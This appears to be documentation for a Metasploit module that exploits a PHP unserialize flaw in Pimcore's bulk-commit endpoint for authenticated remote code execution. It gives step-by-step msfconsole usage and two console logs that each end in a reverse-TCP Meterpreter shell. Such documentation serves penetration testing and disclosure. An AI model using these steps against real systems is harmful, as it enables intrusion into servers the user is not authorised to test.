## Description

This module exploits a PHP (unserialize()) in Pimcore before 5.7.1 to execute arbitrary code. An authenticated user with "classes" permission could exploit the vulnerability.

The vulnerability exists in the "ClassController.php" class, where the "bulk-commit" method make it possible to exploit the unserialize function when passing untrusted values in "data" parameter.

Tested on Pimcore 5.4.0-5.4.4, 5.5.1-5.6.6 with the Symfony unserialize payload.

Tested on Pimcore 4.0.0-4.6.5 with the Zend unserialize payload.

## Vulnerable Application

Affecting Pimcore, version 5.x <= 5.6.6 and 4.x.

## Verification Steps

Set up a default installation of Pimcore 4.x or 5.x (e.g.: `composer create-project pimcore/skeleton my-project` for the 5.x branch) as described on [Pimcore Installation documentation](https://pimcore.com/docs/5.x/Development_Documentation/Getting_Started/Installation.html) then:

1. Start `msfconsole`
2. `use exploit/multi/http/pimcore_unserialize_rce`
3. `set RHOST <IP>`
4. `set USERNAME <USERNAME>`
5. `set PASSWORD <PASSWORD>`
6. `check`
7. You should see `The target service is running, but could not be validated.`
8. `exploit`
9. You should get a meterpreter session!

## Options

* **TARGETURI**: Path to Pimcore installation (“/” is the default)
* **USERNAME**: Username to authenticate with
* **PASSWORD**: Password to authenticate with

## Scenarios

### Tested on Pimcore 5.6.6

```
msf5 > use exploit/multi/http/pimcore_unserialize_rce 
msf5 exploit(multi/http/pimcore_unserialize_rce) > set rhost target.com
rhost => target.com
msf5 exploit(multi/http/pimcore_unserialize_rce) > set rport 8566
rport => 8566
msf5 exploit(multi/http/pimcore_unserialize_rce) > set username admin
username => admin
msf5 exploit(multi/http/pimcore_unserialize_rce) > set password pimcore
password => pimcore
msf5 exploit(multi/http/pimcore_unserialize_rce) > check
[*] 192.168.2.59:8566 - The target service is running, but could not be validated.
msf5 exploit(multi/http/pimcore_unserialize_rce) > exploit

[*] Started reverse TCP handler on 10.0.8.2:4444 
[+] Authentication successful: admin:pimcore
[*] Pimcore version: 5.6.6
[*] Pimcore build: 9722d19576f9e49969d4a3708e045fa481eaad02
[+] The target is vulnerable!
[+] JSON paylod uploaded successful: /var/www/html/var/tmp/bulk-import.tmp
[*] Selected payload: Pimcore 5.x (Symfony unserialize payload)
[*] Sending stage (38247 bytes) to 192.168.2.59
[*] Meterpreter session 1 opened (10.0.8.2:4444 -> 192.168.2.59:34128) at 2019-04-07 12:04:08 +0200
[!] This exploit may require manual cleanup of '/var/www/html/var/tmp/bulk-import.tmp' on the target

meterpreter > 
[+] Deleted /var/www/html/var/tmp/bulk-import.tmp

meterpreter > getuid
Server username: www-data (33)
meterpreter > quit
[*] Shutting down Meterpreter...

[*] 192.168.2.59 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(multi/http/pimcore_unserialize_rce) > 
```

### Tested on Pimcore 4.6.5

```
msf5 > use exploit/multi/http/pimcore_unserialize_rce 
msf5 exploit(multi/http/pimcore_unserialize_rce) > set rhost target.com
rhost => target.com
msf5 exploit(multi/http/pimcore_unserialize_rce) > set rport 8465
rport => 8465
msf5 exploit(multi/http/pimcore_unserialize_rce) > set username admin
username => admin
msf5 exploit(multi/http/pimcore_unserialize_rce) > set password P1mc0r3_4dm1n
password => P1mc0r3_4dm1n
msf5 exploit(multi/http/pimcore_unserialize_rce) > check
[*] 192.168.2.59:8465 - The target service is running, but could not be validated.
msf5 exploit(multi/http/pimcore_unserialize_rce) > exploit

[*] Started reverse TCP handler on 10.0.8.2:4444 
[+] Authentication successful: admin:P1mc0r3_4dm1n
[*] Pimcore version: 4.6.5
[*] Pimcore build: 4123
[+] The target is vulnerable!
[+] JSON paylod uploaded successful: /var/www/html/website/var/system/bulk-import.tmp
[*] Selected payload: Pimcore 4.x (Zend unserialize payload)
[*] Sending stage (38247 bytes) to 192.168.2.59
[*] Meterpreter session 1 opened (10.0.8.2:4444 -> 192.168.2.59:57882) at 2019-04-07 12:00:20 +0200
[+] Deleted /var/www/html/website/var/system/bulk-import.tmp

meterpreter > getuid
Server username: www-data (33)
meterpreter > quit
[*] Shutting down Meterpreter...

[*] 192.168.2.59 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(multi/http/pimcore_unserialize_rce) > 
```